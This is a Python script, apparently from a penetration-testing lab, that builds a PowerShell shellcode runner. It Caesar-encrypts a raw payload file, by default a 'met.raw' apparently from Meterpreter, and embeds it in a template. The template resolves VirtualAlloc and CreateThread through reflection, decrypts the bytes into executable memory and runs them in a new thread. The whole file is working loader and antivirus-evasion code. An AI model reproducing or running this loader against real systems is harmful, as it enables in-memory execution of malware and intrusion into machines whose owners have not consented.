from common.shellcode_formator import to_powershell_array
from common.encrypt_utils import EncryptUtils, Algorithm
import sys

template = """
function LookupFunc {
        Param ($moduleName, $functionName)
        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
                [Parameter(Position = 1)] [Type] $delType = [Void]
        )
        $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
        return $type.CreateType()
}

[Byte[]] $encryptedShellcode = %(encrypted_shellcode)s
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $encryptedShellcode.length, 0x3000, 0x40)
[Byte[]] $buf = @(0)*$encryptedShellcode.length
for ($i=0; $i -lt $encryptedShellcode.length; $i++)
{
    $buf[$i] = ($encryptedShellcode[$i] - %(decryption_key)s) -band 0xFF;
}
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
"""

def get_code(shellcode_path, key):
    encryptor = EncryptUtils(Algorithm.CAESAR, key)
    with open(shellcode_path, 'rb') as f:
        encrypted_shellcode = encryptor.encrypt(f.read())
        output = template % {'encrypted_shellcode': to_powershell_array(encrypted_shellcode), 'decryption_key': str(key)}
        print(output)

shellcode_path = "/home/parallels/lab/clientside_exec/tmp/met.raw"
key = 7
if len(sys.argv) > 1:
    shellcode_path = sys.argv[1]
    if len(sys.argv) > 2:
        key = int(sys.argv[2])
get_code(shellcode_path, key)